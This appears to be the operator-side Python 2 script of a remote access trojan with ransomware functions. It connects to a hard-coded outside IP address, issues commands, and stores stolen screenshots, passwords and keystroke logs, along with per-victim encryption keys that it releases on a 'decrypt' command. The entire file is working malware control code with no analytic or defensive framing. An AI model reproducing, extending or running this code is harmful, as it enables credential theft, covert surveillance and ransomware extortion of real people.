import socket
import sys
import signal
from PIL import Image
from StringIO import StringIO
import threading, time
from packet import Packet
import os

def signal_handler(signal, frame):
        print('You pressed Ctrl+C!')
        sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)

def send(client):
    cmd = raw_input("Enter command: ")
    pkt = Packet()
    pkt.toIP = attackip
    pkt.state = cmd
    if pkt.state == "147":
        base = "C:\Users\Matt\Desktop\\testfolder"
        path = base + "\\" + pkt.toIP + "-encryptionkey"
        try:
            f = open(path,"rb")
            pkt.data = f.read()
            pkt.length = len(pkt.data)
        except:
            print "no encryption key found"
    pkt.send(client)

def receive(s):
    base = "C:\Users\Matt\Desktop\\testfolder"
    while True:
        pkt = Packet()
        pkt.construct(s)
        t = time.time()
        if pkt.state == "100":
            print pkt.data
            global attackip
            attackip = pkt.data
        elif pkt.state == "143":
            path = base + "\screenshot." + str(t) + ".png"
            im = Image.open(StringIO(pkt.data))
            im.save("C:\Users\Matt\Desktop\\testpic.png",'png')
        elif pkt.state == "144":
            path = base + "\passwords." + str(t) + ".txt"
            f = open(path,"w")
            f.write(pkt.data)
            f.close()
        elif pkt.state == "145":
            path = base + "\keystrokes." + str(t) + ".txt"
            f = open(path,"w")
            f.write(pkt.data)
            f.close()
        elif pkt.state == "146":
            if pkt.data != "already encrypted":
                path = base + "\\" + pkt.toIP + "-encryptionkey"
                f = open(path,"w")
                f.write(pkt.data)
                f.close()
            else: 
                print pkt.data
        elif pkt.state == "147":
            print pkt.data
            if pkt.data == "There you go! Sorry about that.":
                path = base + "\\" + pkt.toIP + "-encryptionkey"
                os.unlink(path)
        else:
            print "don't know that one"

ip = '54.201.109.93'
port = 5720

TCP_IP = ip
TCP_PORT = port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))

threading.Thread(target=receive,args=[s]).start()

attackip = ""

while 1:
    send(s)


